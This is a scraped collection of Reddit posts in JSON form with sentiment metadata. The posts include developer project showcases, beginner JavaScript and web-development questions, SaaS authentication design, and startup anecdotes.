is safe to be pushed (all requirements met for release?)\n\nall those steps are completed and validated during the uv-ship pipeline:\n\nthe command syntax for the same operation (and some more) is: `$ uv-ship next minor`\n\nyou can play around in `--dry-run` mode to see the CLI in action.

It integrates with multiple job board APIs (like RemoteOK and Adzuna) to aggregate, process, and store job listings in a central database. The long-term vision is to use AI to provide personalized job recommendations based on a user's skills and profile.\n\nTarget Audience\nPrimarily, it's for junior to mid-level developers who are actively job hunting and tired of the repetitive, manual process of checking multiple websites every day. It's built for developers who appreciate automation and want a more intelligent way to find their next opportunity.\n\nComparison\nCompared to manually browsing LinkedIn or other job boards, OrionJobs AI saves significant time by centralizing opportunities. Unlike a simple RSS feed, it structures and normalizes the data. The key differentiator in the future will be its AI-powered recommendation engine, which aims to provide more relevant matches than the generic algorithms used by larger platforms.\n\nCurrent Status:\nThe backend is 100% \"cloud-ready,\" built with Python, FastAPI, PostgreSQL, and fully containerized with Docker. The data collection system is operational. The full roadmap is in the README.\n\nI'd love to get your feedback on the code, the architecture, or the general idea.

Because clearly the best way to keep your intellectual property is to deposit it on a who-knows-what site you’ve never ever known, owned and operated people you’ll never ever meet, with no idea anywhere your source goes. Completely secure.\n\nEven if you think the site will not retain a copy of your code, the real “obfuscation” is going to be farcical.

We recently passed a new star milestone on GitHub, and I just wanted to say a huge **thank you** to everyone who has shown interest, offered feedback, or contributed. It means the world to me.\n\n# What My Project Does\n\nDucky is a free, open-source desktop application that consolidates the essential tools of a network engineer or security enthusiast into a single, easy-to-use interface. Instead of juggling separate applications for terminal connections, network scanning, and diagnostics (like PuTTY, Angry IP Scanner, etc.), Ducky provides a unified workspace to streamline your workflow. Its core features include a tabbed terminal (SSH, Telnet, Serial), an SNMP-powered network topology mapper, a port scanner, and a suite of security utilities like a CVE lookup and hash calculator.\n\n# Target Audience\n\nDucky is built for anyone who works with network hardware and infrastructure. It's intended to be a serious, daily-use tool for professionals, but it's also simple enough for learners.\n\n* **For Production:** Network Engineers &amp; Administrators for daily tasks like configuring switches and routers, troubleshooting connectivity, and documenting network layouts. Cybersecurity professionals can also use it for reconnaissance and analysis.\n* **For Learning:** Students and hobbyists (e.g., studying for CompTIA Network+ or CCNA) can use Ducky as a free, hands-on tool to explore and interact with real or virtual network devices.\n\n# Comparison\n\nDucky aims to fill a gap between powerful but expensive commercial tools and single-function free utilities.\n\n* **Compared to tools like SecureCRT or MobaXterm Pro:** Ducky provides many of the most-used features (tabbed multi-protocol terminal, session management) but is completely free and open-source. While it doesn't have every advanced feature of those paid tools yet, it covers the daily essentials in a clean, modern interface.\n* **Compared to using separate free tools (like PuTTY + Nmap + a separate subnet calculator):** Ducky's main advantage is integration. The tools are designed to work together. For example, you can discover a device on the Topology Map, click it to see its details, and then launch an SSH session to it without ever leaving the application. This creates a much smoother and faster workflow.\n\n**How You Can Help:**\n\nThe best way you can support the project right now is by giving it a star on GitHub! It provides a huge motivation boost and helps more people discover the tool.\n\n**Easy Download (No Python Needed!)**\n\nI've also launched a small website for the project.

We use **NVIDIA’s Prompt Task and Complexity Classifier** for initial signals, but extend it with **model criteria** derived from benchmarks across task types, domains, and multiple complexity levels.\n\nThis lets us distinguish when a prompt needs high reasoning (e.g., planning or debugging) versus when a lightweight model is sufficient (e.g., writing boilerplate).\n\nWe are now integrating Google’s [UniRoute](https://arxiv.org/abs/2502.08773) and extending it by adding task complexity and domain-awareness to the error-vector method, so routing generalizes to unseen models while staying context-aware.\n\n**Target Audience**\n\nAdaptive is for developers and teams building AI products that need to balance **cost, quality, and reliability** in production.\n\n**Comparison**\n\nMost LLM routing today is naive:\n\n* Route everything to a premium model → high quality, but expensive\n* Route everything to a smaller model → cheap, but quality suffers\n* Route based only on a single complexity score → too coarse, misses nuance\n* Use broad categories like “coding” → ignores the difference between planning, debugging, and writing snippets\n\nAdaptive differs by combining **granular task classification + domain signals + benchmark-driven model criteria** instead of static rules.\n\nThe result: **60–90% lower inference costs** while keeping quality high for workloads that actually demand complex reasoning.\n\n**Repo (open source):** [github.com/Egham-7/adaptive](https://github.com/Egham-7/adaptive)  \n**Website:** [llmadaptive.uk](https://llmadaptive.uk)\n\nWould love feedback from others working on inference routing or multi-model orchestration.", "author": "botirkhaltaev", "subreddit": "Python", "score": 0, "upvote_ratio": 0.5, "num_comments": 0, "created_utc": "2025-09-29T02:18:26", "url": "https://www.reddit.com/r/Python/comments/1nstx1o/showcase_adaptive_opensource_intelligent_llm/", "permalink": "https://reddit.com/r/Python/comments/1nstx1o/showcase_adaptive_opensource_intelligent_llm/", "is_self": true, "domain": "self.Python", "tech_keywords": ["AI", "AR"], "crawled_at": "2025-10-03T13:57:07.283114", "sentiment_score": {"vader_compound": -0.0305, "vader_positive": 0.05, "vader_neutral": 0.894, "vader_negative": 0.056, "textblob_polarity": 0.09382254464285716, "textblob_subjectivity": 0.5175055803571428, "overall_sentiment": "neutral"}},

The app? A tool for designing electrical panels: users drag-drop hierarchical elements (panels → racks → components) on a canvas, then auto-generate invoices (PDFs with BOMs). I'd like a modern UI—dark mode, smooth animations, rounded edges, the works.\n\nPriorities: Cross Platform(MacOS and Windows), high stability/perf (esp. canvas), and minimal new learning juggling other projects.\n\nI know Python and C# basics, but MVVM/XAML trips me up hard (can grind through it, but ugh). Want to stick to \\*one\\* language I can reuse for scripting/automation. No commercial license fees—proprietary means closed-source binaries I can sell without drama.\n\nQuick Project Fit\n\n\\- Core Needs: Interactive 2D canvas for diagramming (drag-drop hierarchies, snapping/zooming), invoice gen (e.g., ReportLab in Python or PdfSharp in C#), SQLite for component catalogs.\n\n\\- Modern UI Goal: aim for Fluent/Material-inspired polish.\n\n\\- Deployment: Standalone .app/.exe bundles, no web bloat.\n\nCurrent Tilt: PySide\n\nIt checks every box—canvas strength, macOS native, Python scripting, easy modernity, and LGPL for sales—without the MVVM wall. Avalonia tempts with .NET ecosystem and MIT simplicity, but the learning hump + diagramming tweaks feel riskier for solo.\n\n\n\nWhat do you guys think? Built something similar?

When code changes unexpectedly, you see the differences right in your git status; no test failures, just behavioral drift detection. Just add the decorator to any function, and execute `run-unittests`. It will redirect all the logs to a text file.\n\n**What My Project Does**\n\nIt is a behavioral consistency framework that automatically captures both function logs and return values, storing them as organized text files that serve as behavioral baselines. Instead of traditional test assertions, it uses git diffs to show when function behavior changes unexpectedly during development. This lets you distinguish between intentional improvements and regressions, with built-in normalization filtering out noise like timestamps and memory addresses. \n\n**Target Audience**\n\nWe built for fast-moving startups and ML teams where constant experimentation happens but core functionality needs stability. It's perfect for environments where multiple developers iterate rapidly on shared codebases, and you want to encourage prototyping while catching behavioral drift. If you're in a startup where \"move fast and break things\" is the mantra but some things really shouldn't break, this provides the guardrails you need. We quickly catch bugs because we know exactly where to look when some log deviates.\n\n**Comparison**\n\nWhile pytest frameworks validate final results through explicit checks, difflogtest monitors the entire execution process: capturing logging, intermediate steps, and outputs for a complete behavioral picture. If you care more about how functions behave throughout execution rather than just final results, this gives you comprehensive monitoring without the test writing overhead. \n\nI'm not sure if this already exists, but for our use case we needed something like this and didn't find a good alternative.

{"post_id": "1nwvj21", "title": "I made a free tool to export any project into a single .txt file for AI.", "content": "Hey r/javascript \n\nQuick heads-up, this is a self-promotion post. I've read the rules, and my main goal is to share a tool I built for myself that I think others might find useful and to get your honest feedback.\n\n**The Problem I Was Facing:**\n\nI use the web versions of ChatGPT, Claude, and Gemini a lot in my workflow. The biggest pain point has always been getting my entire project's context to the AI. Copy-pasting dozens of files is slow and you lose the project structure. Even worse is having to manually filter out all the stuff you don't want the AI to see—like node\\_modules, images, videos, and build artifacts—which just wastes the precious context window.\n\nSo, I built this free, online tool to fix that: [**project2txt.com**](http://project2txt.com)\n\nIts job is simple: turn your entire project folder into a single, clean .txt file that's perfectly formatted for an AI to understand.\n\n**Key Features:**\n\n* ✅ **100% Private &amp; Client-Side:** Your code **never** leaves your browser. All processing is done locally; nothing is uploaded or collected.\n* 🧠 **Smart Filtering:** Automatically ignores junk like node\\_modules, .git, images, videos, and build artifacts, keeping only the useful source code.\n* ⚙️ **Precise Control:** After it analyzes your folder, you can pick the exact folders and file types you want to include.\n* 🌳 **Optional Directory Tree:** You can add a tree-style directory structure at the top of the export to give the AI better context before it reads the code.\n* 🚀 **Universal &amp; Instant:** Works with any project from any IDE (VSCode, IntelliJ, etc.). Just drag and drop the folder.\n\nI genuinely think this could save a lot of people a lot of time, and I'd love to hear what the community thinks.\n\nWould this be useful in your workflow? Any features you'd like to see?\n\nThanks everyone", "author": "0xEyon", "subreddit": "javascript", "score": 0, "upvote_ratio": 0.22, "num_comments": 3, "created_utc": "2025-10-03T19:36:14", "url": "https://project2txt.com", "permalink": "https://reddit.com/r/javascript/comments/1nwvj21/i_made_a_free_tool_to_export_any_project_into_a/", "is_self": false, "domain": "project2txt.com", "tech_keywords": ["AI", "AR", "javascript", "chatgpt", "share"], "crawled_at": "2025-10-03T13:57:07.330326", "sentiment_score": {"vader_compound": 0.9893, "vader_positive": 0.151, "vader_neutral": 0.798, "vader_negative": 0.051, "textblob_polarity": 0.16394557823129255, "textblob_subjectivity": 0.4906972789115646, "overall_sentiment": "positive"}},

{"post_id": "1nwf0ta", "title": "[AskJS] Questions about my first job", "content": "I recently finished my internship and accepted an offer to stay at the same company. Before this, I had no experience with web dev. Since this is my first professional dev job, I’m not sure if some of their coding practices are normal or outdated, so I’d like to ask for feedback.\n\n(ABC is just a prefix I use to demonstrate, they use something else.)\n\n* Their front-end stack is a bit unusual to me: Vanilla JavaScript (mostly ES5), jQuery, Bootstrap, Google Closure.\n* They use JavaScript with Google Closure Compiler and JSDoc annotations to have some type safety. No TypeScript. Example:\n\n```\n        goog.provide('src.js.CompanyLibrary.ui.form.AbcFormGrid');\n        \n        /**\n         * u/public\n         * u/constructor\n         * u/param {string} id\n         * @extends {AbcComponent}\n         */\n        function AbcFormGrid(id)\n        {\n          abc.base(this, id);\n          /**\n           * @protected\n           * @type {string}\n           */\n          this.containerClass = 'h-100';\n        \n          // rest of the class\n        }\n        \n        /**\n         * @public\n         */\n        AbcFormGrid.prototype.showAllRows = function()\n        {\n          const data = this.grid.getContainer()['bootstrapTable']('getData');\n          const length = data.length;\n          for (let i = 0; i &lt; length; i++)\n          {\n            this.grid.getContainer()['bootstrapTable']('showRow', { index: i });\n          }\n        };\n        \n        // more methods\n```\n\n* They don’t use ES6 features like classes, modules, etc. Classes are defined with a function and methods added to its prototype.\n* They do UI inheritance with sometimes 6–7 levels of nested inheritance.\n* They built their own framework/library around this inheritance. Example: ABCBaseComponent &lt; ABCFormGrid &lt; ABCBaseGrid &lt; ABCSomeContentGrid\n* They have a class called ABCConstants, which has string constants like:\n\n```\n        ABCConstants.OpenParenthesis\n        ABCConstants.CloseParenthesis\n        ABCConstants.Equals\n        ABCConstants.Table_Name_SomeTable\n```\n\nWe use these to build queries like:\n\n```\n        whereClause = columnName + ABCConstants.Equals + ABCConstants.Quote + value + ABCConstants.Quote;\n        \n        var query = new ABCQueryDef();\n        query.setTables([tableName]);\n        query.setOutputFields([\n          ABCConstants.Count \n          + ABCConstants.OpenParenthesis \n          + ABCConstants.Star \n          + ABCConstants.CloseParenthesis\n        ]);\n        query.setWhereClause(whereClause);\n        query.setDataSource(this.getDataSource().getName());\n```\n\nSince this is my first dev job, I don’t know if I’m just inexperienced and these are normal legacy patterns, or if I should be concerned.

{"post_id": "1nv49a7", "title": "[AskJS] Subtle JS memory leaks with heavy DOM/SVG use—anyone else see this creep up after hours?", "content": "Guys our team is going through with a kinda sneaky memory leak. We’re using JS (React + D3) to render these huge SVG graphs (like, thousands of nodes/edges). Every time you zoom, pan, or filter, we basically rip out the old SVG and draw a new one. We’re *super* careful about cleanup using `useEffect` to remove all elements with `d3.select().remove()`, aborting fetches, clearing timers, and killing event listeners when stuff unmounts. But here’s where it gets weird: **a**fter about an hour of heavy use, Chrome DevTools shows memory (DOM nodes, listeners, heap) *slowly* climbing. It’s not a huge spike, but eventually, the app gets sluggish. We’ve ruled out the usual stuff no globals, no dangling timers or listeners.\n\nThe best guess is some deep DOM/SVG/engine thing is holding onto refs even after removing nodes. Maybe it’s a bug in a lib, a browser quirk, or just our own blind spot. Heap snapshots help, but the leak’s so gradual, it’s a pain to track.\n\nSo, anyone else hit this? Especially in apps where React + D3 handle big, dynamic SVG? Any hidden traps in SVG, D3, or the DOM itself that can cause slow memory leaks? Or new tips for catching these “slow creep” leaks?

{"post_id": "1ntt1qt", "title": "Short Authentication Strings authenticated E2EE File Transfer with WebRTC", "content": "Has anyone of you used tools like croc or wormhole, where the security hinges upon a small secret code like `7-crossover-clockwork`. The code there is used for Password Authenticated Key Exchanges (PAKEs), which serve both purposes -&gt; authenticity and confidentiality. Well i asked myself whether we can make the code non-secret and (maybe only subjectively) even smaller. Also i'm not very content with the maintainers sleeping on post-quantum secure encryption, despite it being standardized for quite some time. Though i think most of them wait until production ready quantum-safe PAKEs appear, which, however, may take some time.\n\nAnyway, the solution is a simple cryptographic protocol from the year 2006 (and was even used in a somewhat related from in the PGPfone), which realizes authentication from \"Short Authentication Strings\", in short SAS. This approach is actively used in ZRTP and there are also options for it in matrix/element. You can find more details about it on my post https://whitenoise.systems/blog/eprint-2025-1598/\n\nAt first i implemented a small prototype in the summer and was quite surprised how my crypto and infosec collegues liked it. Thus i decided to go some steps further and decided to bake the core functionality into some npm packages. You can find a list in my docs https://whitenoise.systems/tools/docs/. Before implementing a proper web-app for Browsers, i, however, decided to test these packages inside a cli application https://www.npmjs.com/package/@noisytransfer/cli . (you can find the according github repositories from the NPM packages or the docs i have referenced)\n\nI'm aware that JS or node may not be the best choice for such an application. It is currently planned only as an experimentation playground for post-quantum cryptography integrated applications for file-transfer and also to see reactions from others on the UX of the SAS-based transfer. At some point when it's performant enough and people are actually using it, i will port the code to some other language like Go or Rust. From this cli i'm not earning any money, nor does it cost much to maintain it (beside my sweat and nerves).\nI'm also aware that APGL3.0 is not the most permissive license for others to contribute and integrate these tools into their projects. The license choice is not final and my opinion may shift if this is really the only problem people are having with my tools. \n\nLast, but not least, the cli tool currently has some limitations and it's not the most performant out there. The reason for these limitations is that it's very early in the development and is in alpha stage at best. In the following months i will try to find time to optimize things and cleanup the code. It's currently a big mix of LLMs, Stack-Overlow and my own crazy ideas that are only half-baked or were discarded half-way through. But considering that i have to prepare for the defense of my PhD, i wont finish this this year. Therefore i decided to come out with this now and use the next months rather to gather reactions and ideas from the public.\nHave fun transferring with PQ-security and \"universal composability\" guarantees as my formal modelling in https://eprint.iacr.org/2025/1598 suggests.

{"post_id": "1noik6y", "title": "[AskJS] Could anyone help this beginner with some workplace automation for Chrome?", "content": "Hi folks! I'm trying to set up some systems at work that can automate some of the \"busywork\" tasks that we've got to do. The issue I have is that I know enough to know there IS a solution to things, but not enough to know what that solution IS or how to find/look for it. That said, I'll outline what I've got to work below.\n\nSo that big things I've got to work around are that we use a site to accomplish anything in our system (for which we can only use Chrome) and second, corporate does not want us using and extensions FOR Chrome. I ***have*** asked on both counts, and I can confirm I'm JUST left with the native Javascript in the Devtools console. So I KNOW that what I've got (and whatever I MIGHT get working) is going to be ROUGH, but if it saves me spending 3 hours a day manually going to a file's page to click ONE thing and save for like, a hundred files, I will take \"janky but functional automation\".\n\n(I cannot name the site, nor provide direct examples of pages/buttons/backend code, for – I hope – obvious reasons! I can do what I can to go over it all in comments though, if that's relevant!)\n\nThe big question I have is whether there's a better way to even have the automation set up to begin with. Because I'm working through the website, any time I navigate to a page, and any time half the system functions go off, the whole page reloads and any of my local variables or running code resets. \n\nCurrently, I have a sort-of state machine to handle things. I have a listener embedded in a local override of a file that's on every page, and it checks the value of a sessionStorage key to compare for some ifs or cases. So I have:\n\n\n    window.addEventListener('load', () =&gt; {\n        if (sessionStorage.getItem(\"Running\") = \"On\") {\n            switch (parseInt(sessionStorage.getItem(\"Step\"))) {\n                case 0: 《code for first step》\n                    break;\n                case 1: 《code for next step》\n                    break; 《etc》\n            }\n        }\n    };\n\n(I actually have the if and switch cases wrapped up in a different function and the event listener is just the one line running that extra function, but you know, for clarity)\n\nOnly issue is that I'm having to manually keep track of when during the process the page reloads and then hard-coding that in as a new case.\n\n***SO:*** Is there a better way to go about this (again, with only devtools javascript) so that it can automate going to/saving/updating multiple pages?\n\n***AND*** whichever way winds up being best, are there any pointers for what parts of Javascript I ought to learn to make things easier on myself? (I'm thinking data types so it's not a mile-long JSON string in the sessionStorage that needs 6 different kinds of parsing to get to what I want)\n\nAgain, sorry! I know I'm not great with this (the asking AND the coding), so I appreciate any help I can get!\n\n[EDIT] Thank you all for the help! I ***think*** I've managed to get it going with iframes? I\")) have to pay attention to it to see. But I wouldn't have thought to try them if someone hadn't suggested they could do the trick! That's exactly why I asked.

{"post_id": "1nn19qk", "title": "[AskJS] What aviation accidents taught me about debugging complex JS systems (and how you can use it this week)", "content": "What aviation accidents taught me about debugging complex JS systems (and how you can use it this week)\n\nJavaScript isn’t just a language-it’s an ecosystem of complexity. Frontend UIs, async bugs, backend APIs, build chains, observability… and when something breaks, it’s rarely just “a line of code.”\n\nIt’s often a human moment: misread logs, tunnel vision in the debugger, a race condition you couldn’t see coming.\n\nThat’s where I think aviation safety has a ton to teach us. I’ve spent the last year researching real-world aviation accidents (AF447, Helios 522, Tenerife, Qantas 32), and I kept asking: what if software engineering took human factors this seriously?\n\nHere are 3 lessons I think apply directly to the world of JavaScript development:\n\n1) Surface system “modes” clearly - Helios 522, 2005\nA mode switch left in the wrong setting doomed a flight. The crew didn’t notice, and UI design failed them.\n\nJS relevance: Mode confusion is real in software too: are we in staging or prod? Is that button disabled because of a flag or a race? What state is this component actually in?\n\n→ Make modes loud. Add visual markers in dev tools, console banners for envs, visible toggles for feature flags. State needs to shout under stress.\n\n2) Situational awareness is a role, not a side effect -Eastern 401, 1972\nThe crew got fixated on a landing gear light and crashed. Nobody was tracking the big picture.\n\nJS relevance: Ever debugged an issue and realized hours later it wasn’t the real problem? Or missed that a caching layer was involved?\n\n→ Assign someone to keep a full-system view during incidents or deep bugs-especially when working across frontend/backend boundaries. Someone who’s not hands-on-keyboard, but watching what matters.\n\n3) Train for uncertainty, not just happy paths - Qantas 32, 2010\nAn explosion led to cascading alerts. What saved the plane? A crew trained to prioritize and think critically under uncertainty.\n\nJS relevance: Are your devs only trained on smooth dev workflows? Can they diagnose a stale state bug, or cascading API failures in prod?\n\n→ Add “messy drills” to your retros or team demos. Break a small thing (e.g., async race, flaky flag, bad cache) and time how quickly the root cause emerges.

It finally feels like it’s at a point where I’d like to get some feedback.\n\n**Demo:** [https://demo.daff.io/](https://demo.daff.io/)  \n**GitHub:** [https://github.com/graycoreio/daffodil](https://github.com/graycoreio/daffodil)\n\nIf you have Angular 19 handy, you can spin up the same demo with just:\n\n```bash\nng add @daffodil/commerce\n```\n\nI’m trying to solve two distinct challenges:\n\nFirst, I absolutely hate having to learn a new ecommerce platform. We have drivers for printers, mice, keyboards, microphones, and many other physical widgets in the operating system, why not have them for ecommerce software? It’s not that I hate the existing platforms, their UIs or APIs, it's that every platform repeats the same concepts and I always have to learn some new fangled way of doing the same thing. I’ve long desired for these platforms to act more like operating systems on the Web than like custom built software. Ideally, I would like to call them through a standard interface and forget about their existence beyond that.\n\nSecond, I’d like to keep it simple to start. I’d like to (on day 1) not have to set up any additional software beyond the core frontend stack (essentially yarn/npm + Angular). All too often, I’m forced to set up docker-compose, Kubernetes, pay for a SaaS, wait for IT at the merchant to get me access, or run a VM somewhere just to build some UI for an ecommerce platform that a company uses. More often than not, I just want to start up a little local http server and start writing.\n\nWe currently support Magento / MageOS / Adobe Commerce (full) , Shopify (partial), Medusa (wip, [PR Here](https://github.com/graycoreio/daffodil/pull/3939))\n\nAny suggestions for drivers and platforms are welcome, though I can’t promise I will implement them. :)", "author": "damienwebdev", "subreddit": "javascript", "score": 12, "upvote_ratio": 0.93, "num_comments": 2, "created_utc": "2025-09-19T11:43:48", "url": "https://github.com/graycoreio/daffodil", "permalink": "https://reddit.com/r/javascript/comments/1nkryi0/daffodil_opensource_ecommerce_framework_to/", "is_self": false, "domain": "github.com", "tech_keywords": ["AI", "AR", "kubernetes", "docker"], "crawled_at": "2025-10-03T13:57:07.487566", "sentiment_score": {"vader_compound": 0.9758, "vader_positive": 0.115, "vader_neutral": 0.852, "vader_negative": 0.033, "textblob_polarity": 0.08938210227272728, "textblob_subjectivity": 0.4466382575757577, "overall_sentiment": "positive"}},

{"post_id": "1nw979w", "title": "Do I raise concerns around my teams performance with my boss?", "content": "I've recently started a new job about 6 months ago. I'm a senior dev with quite a lot of experience. \nMy coworkers are all mid level around 5-6 years experience.\nWhen I joined, a new project was being started where 1 co-worker was given time to do it and tasks assigned. The project wasn't done by the date, not even a little bit close. I was then tasked to help get it over the line. The code was ok, but a lot of silly things here and there that needed refactoring. E.g. mapping state on every single render, to generate the same thing from API data. Not an issue initially, but as soon as you start adding events it is. So things like this I refactored. We're now another month over due.\n\n\nI've noticed in this time that coworkers are barely doing anything at all. I'm completing 5-6+ tasks on average per day, they do 1 every 2 days.\nI chalked it up to experience, and that's fine.\n\n\nBut in stand ups there's really really dumb excuses. \"I didn't realise that button was used in 2 places so I had to refactor yesterday\" its literally a 10 line component and the only difference is size of the icon, in one place was 50px in another 25px. How on earth did that take 8 hours to refactor it? It would take me less than 20 mins. Even if we assume this person is 10x slower than me, that's still less than 4 hours.\n\n\nThere was a scenario where another dev was \"blocked\" by changes needing to be made in a lambda that he \"needed\" me to make. He is also capable of making lambda changes (and helped me learn how lambdas worked). I told him the EXACT line to make the change and what to add, I wrote the code in chat to him. Somehow he was blocked for 2 days. He did no code changes at all for 4 days on any of our repos, then blames me not making the change!! Anyway...\n\nWhat should I do? Raise this with my boss? It's my bosses team, so I feel like it's going to alienate me from the team, and potentially make my boss dislike me, not the others.  I feel like I'm on a sinking ship with a bucket trying to stop it going down.\n\n", "author": "Select_Yoghurt_1138", "subreddit": "webdev", "score": 81, "upvote_ratio": 0.83, "num_comments": 78, "created_utc": "2025-10-03T01:53:10", "url": "https://www.reddit.com/r/webdev/comments/1nw979w/do_i_raise_concerns_around_my_teams_performance/", "permalink": "https://reddit.com/r/webdev/comments/1nw979w/do_i_raise_concerns_around_my_teams_performance/", "is_self": true, "domain": "self.webdev", "tech_keywords": ["AI", "AR"], "crawled_at": "2025-10-03T13:57:07.515061", "sentiment_score": {"vader_compound": -0.8195, "vader_positive": 0.044, "vader_neutral": 0.899, "vader_negative": 0.057, "textblob_polarity": -0.003081750951069129, "textblob_subjectivity": 0.3782090384363112, "overall_sentiment": "negative"}},

I understand the value of monitoring streaming experience but I was surprised it was feasible for them to send the frames from the user to a compute unit for each frame. Along with audio, I assume, because they also wanted to check if there were audio-video sync issues. Wouldn't this double throughput for example and affect the latency? Upload is also usually slower than download and now the client is doing that too (for each frame).\n\nHow can you accurately monitor since the double network work would also affect streaming quality in the first place?\n\nI also believe an alternate option would be to do all the computation on the client, although there's a wide variety of devices using these services, and this could be very tasking for some. And there might be some info they needed to compare with that's only available server-side, so yeah, probably not an option \n\nSo I guess what I'm asking is:\n\n(a) Was this actually what was happening? That's what I see, even in the new, in-memory architecture\n(b) How come this was feasible? Is the extra work actually just not that significant?\n(c) What would be some alternatives to this approach if it wasn't?\n\nOf course, I assume they know what they're doing, this is just me trying to understand some things as I'm still very inexperienced", "author": "blckJk004", "subreddit": "webdev", "score": 2, "upvote_ratio": 1.0, "num_comments": 1, "created_utc": "2025-10-02T21:39:21", "url": "https://www.reddit.com/r/webdev/comments/1nw2my0/re_the_infamous_prime_video_microservices_article/", "permalink": "https://reddit.com/r/webdev/comments/1nw2my0/re_the_infamous_prime_video_microservices_article/", "is_self": true, "domain": "self.webdev", "tech_keywords": ["AI", "AR", "microservices"], "crawled_at": "2025-10-03T13:57:07.566900", "sentiment_score": {"vader_compound": 0.8211, "vader_positive": 0.041, "vader_neutral": 0.951, "vader_negative": 0.007, "textblob_polarity": 0.03906818181818182, "textblob_subjectivity": 0.4438106060606059, "overall_sentiment": "positive"}},
{"post_id": "1nvxeko", "title": "SaaS tenant authentication", "content": "I have a B2B SaaS that currently allows a 1:1 relationship with a user and a tenant (users table has a tenant_id). I do not have subdomains so everyone is directed to /login and it uses the email to lookup the tenant. Only company emails are allowed and it restricts emails to the signed up tenant (so company.com can only have users with a company.com email) which I know is limiting.\n\nI want to introduce SSO as many customers need this for easy authentication and no managing separate passwords etc. for 300 users in their tenant.\n\nBut now the 1:1 relationship falls apart as a contractor (for example) could be in many different tenants that are signed up. So the email mapping to tenant no longer makes sense.\n\nI don’t want a “Global ID” with a pivot for users and tenants as I still want those smaller tenants without SSO to be able to manage passwords if they desire. I could introduce a pivot with a password?\n\nThe current users table is unique by email, my head is taking me down the route of allowing duplicate emails in the users table and making it unique by tenant_id and email and introducing subdomains so tenant intent is known and there’s separate passwords, roles etc. for the same user in different tenants.\n\nAm I okay for thinking this way? Will I be introducing any scaling issues in the future? If I always pull tenant_id into authentication requests with email and password (assuming they’re not on SSO) will this be adequate?\n\nIf there are any other ways this could be solved I’d be happy to hear it!\n\nApologies for the mind dump, but my head has been spinning with this for a while now and I need to get some outside feedback. Let me know if you have any questions or if anything needs clarifying.\n\nEDIT: SSO is unique per tenant and lives on the tenant model, it’s a “bring your own SSO”\n\nEDIT: current flow is that a user registers and it checks to see if that email domain belongs to a tenant, if it does it invites a user to that tenant and sets them as pending for admins to approve. If no tenant exists for that domain it asks the user for a company name and gives the user admin to invite other users to their tenant.

{"post_id": "1nwkp7n", "title": "How I attracted 3 VCs in 6 hours while developing my startup, which I will not promote", "content": "I arrived in SF three days ago and wanted to test a build in public experiment. Like really in public, in a cafe. I sat at Blue Bottle from 7am to 1pm with a sign on my laptop that read “coffee on me for valuable feedback.” It worked, people smiled, and I met a lot of interesting folks, including investors and founders. I have a post from this morning with an image of how it looked, I can share if you ask for it, I cannot attach it here. This is what I learned:\n\n**Timeline:**\n\n* 7:00 to 9:00 quiet time, a few good chats\n* around 9:00 biggest rush, I could not keep up with follow-ups and quick demos\n* 10:45 to 12:15 dead time\n* 12:15 to 13:00 rush again\n* left at 13:00 when the battery died\n\n**Numbers:**\n\n* 121 people looked at the sign, only the ones I noticed and counted. Possibly it was 2 to 3 times higher.\n* 17 conversations, about 25 people total since some came in pairs\n* 14 new LinkedIn and Twitter connections\n* 3 VCs connections\n* 3 founder connections\n* 0 coffees bought by me\n\n**Conversion**\n\n17 conversations out of 121 sign views, about 14 percent. I likely missed many glances, if real views were closer to twice that, call it around 7 to 8 percent. Also, it helps if you notice and start the conversation first, then people approach you. I think 3 VCs is very good number. will see how it goes from here.\n\nWhat it felt like in practice, I was sitting on the other side of the register, facing it, so many people ordered first, then while they waited for their coffee, they noticed the sign and maybe we talked. Lots of mobile pickup, many did not stop. Sign placement was not ideal, you had to turn from the deck to see it, but it was still the best seat I could get. Net result, it was a very productive time, even though actual coding was tough during the rush. If you try this, please buy something from the cafe, and if you stay long, consider buying more than once. I asked the staff if the sign was okay, and they said it was totally fine, so big thanks to this cafe.\n\nNow I am at home to keep building my startup. Good luck to anyone building or fundraising out there!\n\n\n\nWhat else should I try next time?", "author": "_s0uthpaw_", "subreddit": "startups", "score": 191, "upvote_ratio": 0.89, "num_comments": 44, "created_utc": "2025-10-03T09:23:14", "url": "https://www.reddit.com/r/startups/comments/1nwkp7n/how_i_attracted_3_vcs_in_6_hours_while_developing/", "permalink": "https://reddit.com/r/startups/comments/1nwkp7n/how_i_attracted_3_vcs_in_6_hours_while_developing/", "is_self": true, "domain": "self.startups", "tech_keywords": ["AI", "AR", "share"], "crawled_at": "2025-10-03T13:57:07.699546", "sentiment_score": {"vader_compound": 0.9857, "vader_positive": 0.102, "vader_neutral": 0.872, "vader_negative": 0.025, "textblob_polarity": 0.20275576275576276, "textblob_subjectivity": 0.42374902874902876, "overall_sentiment": "positive"}},

{"post_id": "1nw0qc6", "title": "Founders in Recovery? (I Will Not Promote)", "content": "Hi r/startups, I’d like to talk about a topic that I haven’t really seen discussed on here before: Recovery. (TL;DR: at the bottom)\n\nBackground:\n\nCollege is where my issues began, when I picked up a bad habit from some CS buddies. As a sheltered kid, I got in over my head and ultimately squandered my opportunity at a big state school, had to drop out, &amp; attended a recovery program before even being 21. Despite the lack of a degree, over the years I’ve managed to catch up to my peers &amp; have risen to a pretty good career position. However, I’m ashamed to admit that the last couple of years I got back into my old habit, albeit a lot more regimented than before.\n\nWith the reduced indulgence, I’ve been able to maintain my path &amp; have made a lot of positive contributions to both my org and personal goals/projects. I’m now in my mid 20s (with a fully developed brain lol), and as such I’ve recently been doing some self evaluation into my life, and where I want to be in the future.\n\nWhen I look back, it’s pretty clear that the periods in which I didn’t partake resulted in almost exponential career/pay &amp; skill growth as opposed to my current track. While I’ve still been improving, I know now that it’s time to cut out the BS and get serious if I ever hope to amount to something substantial and want to one day turn my startup into a fulltime gig. Further, I’ve been at my current role for 3 years now &amp; am starting to feel like I’m stagnating/not growing as fast as I should be.\n\nMy partner &amp; I had a discussion and we both agree this is something we both need to do. We’ve tried quitting in the past, but didn’t follow through. This time feels different though, and we’re currently on day 4. Further, this time around we’re doing it the “right” way and going all in (e.g., removing people, places, things, and situations that could be triggering, attending meetings, &amp; starting to look for a sponsor).\n\nOne thing I’ve yet to see though that I think could help is hearing from others (in this community specifically), and your personal experiences/tips/etc. I searched, but couldn’t find anything that really touched on this subject, so I figured I’d post myself.\n\nFurther, I’ve seen a lot of founders who glamorize/endorse such habit(s), or fall into the lucky boat of people who don’t have an issue with their habit standing in the way of their success. Unfortunately that’s not helpful, or what I need to hear.\n\n**TL;DR:** My life partner &amp; I have finally recognized that one of our habits is holding us back from our full potential &amp; have begun our recovery process.\n\nWith that, my questions to the community members here who have experience in this area 